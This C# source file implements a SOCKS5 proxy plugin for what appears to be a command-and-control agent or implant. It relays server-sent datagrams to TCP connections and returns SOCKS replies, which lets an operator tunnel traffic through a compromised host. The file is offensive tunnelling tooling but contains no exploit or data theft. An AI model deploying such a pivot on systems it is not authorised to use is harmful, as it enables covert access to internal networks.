using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;
using Nager.TcpClient;

namespace Agent
{
    public class Plugin : IPlugin, IProxyPlugin
    {
        public string Name => "socks";
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ConcurrentDictionary<int, TcpClient> connections { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.logger = logger;
            this.connections = new ConcurrentDictionary<int, TcpClient>();
        }

        public async Task Execute(ServerJob job)
        {
        }
        public async Task HandleDatagram(ServerDatagram sm)
        {
            if (!connections.ContainsKey(sm.server_id) && sm.exit)
            {
                return;
            }

            if (!connections.ContainsKey(sm.server_id))
            {

                if (!await HandleNewConnection(sm))
                {
                    await ReturnMessageFailure(sm.server_id);
                }
                return;
            }

            if (!string.IsNullOrEmpty(sm.data))
            {
                await connections[sm.server_id].SendAsync(Misc.Base64DecodeToByteArray(sm.data));
            }

            if (sm.exit)
            {
                connections[sm.server_id].Disconnect();
            }
        }
        private async Task<bool> HandleNewConnection(ServerDatagram sm)
        {
            if (string.IsNullOrEmpty(sm.data))
            {
                return false;
            }

            ConnectionOptions co = new ConnectionOptions(sm); //Begin to parse the packet
            
            if (!co.Parse())
            {
                await ReturnMessageFailure(co.server_id);
                return false;
            }

            var client = new TcpClient(sm.server_id);
            client.DataReceived += OnDataReceived;
            client.Connected += OnConnected;
            client.Disconnected += OnDisconnected;

            return await client.ConnectAsync(co.ip.ToString(), co.port) && connections.TryAdd(client.server_id, client);
        }

        public async Task ReturnMessageFailure(int id)
        {
            await this.messageManager.AddResponse(
                DatagramSource.Socks5,
                new ServerDatagram(
                    id,
                    new ConnectResponse
                    {
                        bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                        bndport = new byte[] { 0x00, 0x00 },
                        addrtype = (byte)AddressType.IPv4,
                        status = ConnectResponseStatus.GeneralFailure,
                    }.ToByte(),
                    true
                ));
        }
        public async Task ReturnSuccess(int id)
        {
            ServerDatagram smOut = new ServerDatagram(
             id,
             new ConnectResponse
             {
                 bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                 bndport = new byte[] { 0x00, 0x00 },
                 addrtype = (byte)AddressType.IPv4,
                 status = ConnectResponseStatus.Success,
             }.ToByte(),
             false
            );
            await messageManager.AddResponse(DatagramSource.Socks5, smOut);
        }
        private void OnConnected(int server_id)
        {
            ReturnSuccess(server_id);
        }

        private void OnDataReceived(DataReceivedEventArgs args)
        {
            messageManager.AddResponse(DatagramSource.Socks5, new ServerDatagram(args.server_id, args.bytes, false));
        }

        private void OnDisconnected(int server_id)
        {
            messageManager.AddResponse(DatagramSource.Socks5, new ServerDatagram(server_id, new byte[0], true));
        }
    }
}
